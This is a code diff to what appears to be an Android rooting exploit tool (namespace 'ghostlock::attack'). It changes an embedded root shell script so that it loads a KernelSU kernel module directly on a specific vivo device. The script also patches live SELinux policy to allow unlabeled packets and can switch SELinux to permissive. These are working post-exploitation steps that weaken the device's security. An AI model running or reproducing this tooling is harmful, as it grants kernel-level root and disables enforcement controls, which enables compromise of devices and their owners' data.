@@ -245,6 +245,8 @@ namespace ghostlock::attack {
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
+            "KSU_KO='%s'\n"
+            "KSU_ENFORCE=%s\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
             "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
@@ -315,11 +317,32 @@ namespace ghostlock::attack {
             "fi\n"
             "KVER=$(uname -r | cut -d. -f1-2)\n"
             "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
-            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
-            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
-            "  exit 1\n"
+            /* direct vendor-module path: kernels shipped without a KMI token in
+             * uname -r (e.g. vivo 5.15.197-custom) can never satisfy the KMI
+             * lookup below; when the embedder staged a matching .ko (its module
+             * version must match the ksud, else the manager handshake fails),
+             * insmod it directly and skip the KMI machinery entirely.
+             * Device scoping: validated end-to-end on PD2338 (vivo iQOO Neo9,
+             * 16.2.13.2, kernel 5.15.197-g708015331567-dirty) — direct insmod
+             * + unlabeled-packet live-policy patches keep Enforcing with full
+             * network. Other devices need their own kernelsu-vivo.ko rebuild.
+             * PD2338 PER-KERNEL RULE: the module is bound to the exact kernel
+             * build, not just the device — vermagic must match byte-for-byte
+             * and struct module layout (init/cleanup offsets) is fixed by that
+             * kernel's .config (LTO/CFI). Any OTA that bumps the kernel
+             * release (e.g. 16.2.13.x -> 16.3.x) invalidates the bundled .ko;
+             * rebuild against the new kernel tree before redeploying, else
+             * insmod fails or loads a layout-incompatible module. */
+            "DIRECT=0\n"
+            "if [ -n \"$KSU_KO\" ] && [ -f \"$KSU_KO\" ]; then DIRECT=1; fi\n"
+            "KMI=''\n"
+            "if [ \"$DIRECT\" -eq 0 ]; then\n"
+            "  if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
+            "    echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
+            "    exit 1\n"
+            "  fi\n"
+            "  KMI=\"${AVER}-${KVER}\"\n"
             "fi\n"
-            "KMI=\"${AVER}-${KVER}\"\n"
             "# safe mode: disable all modules before exec ksud\n"
             "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
             "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
@@ -391,10 +414,16 @@ namespace ghostlock::attack {
             "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
             "    exit 1\n"
             "  fi\n"
-            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+            "  if [ \"$DIRECT\" -eq 1 ]; then\n"
+            "    echo \"[*] direct insmod $KSU_KO\" >>\"$LOG\"\n"
+            "    \"$KSUD\" insmod \"$KSU_KO\" >>\"$LOG\" 2>&1\n"
+            "    echo \"[*] insmod exit=$?\" >>\"$LOG\"\n"
+            "  else\n"
+            "    echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+            "    \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            "    echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+            "  fi\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
@@ -411,12 +440,26 @@ namespace ghostlock::attack {
             "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
             "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
             "fi\n"
+            "if [ \"$DIRECT\" -eq 1 ]; then\n"
+            "  \"$KSUD\" sepolicy patch 'allow * unlabeled:packet send' >>\"$LOG\" 2>&1\n"
+            "  \"$KSUD\" sepolicy patch 'allow * unlabeled:packet recv' >>\"$LOG\" 2>&1\n"
+            "  echo '[*] unlabeled packet sepolicy patched' >>\"$LOG\"\n"
+            "  if [ \"$KSU_ENFORCE\" = \"0\" ]; then\n"
+            "    echo '[*] KSU_ENFORCE=0: switching permissive' >>\"$LOG\"\n"
+            "    echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
+            "  else\n"
+            "    echo '[*] keeping enforcing (live-policy packet patches active)' >>\"$LOG\"\n"
+            "  fi\n"
+            "fi\n"
             "else\n"
             "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
             "fi\n",
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            /* direct vendor-module deployment (empty = classic KMI late-load) */
+            (getenv("GHOSTLOCK_KSU_KO") ? getenv("GHOSTLOCK_KSU_KO") : ""),
+            (getenv("GHOSTLOCK_KSU_ENFORCE") ? getenv("GHOSTLOCK_KSU_ENFORCE") : "1"),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
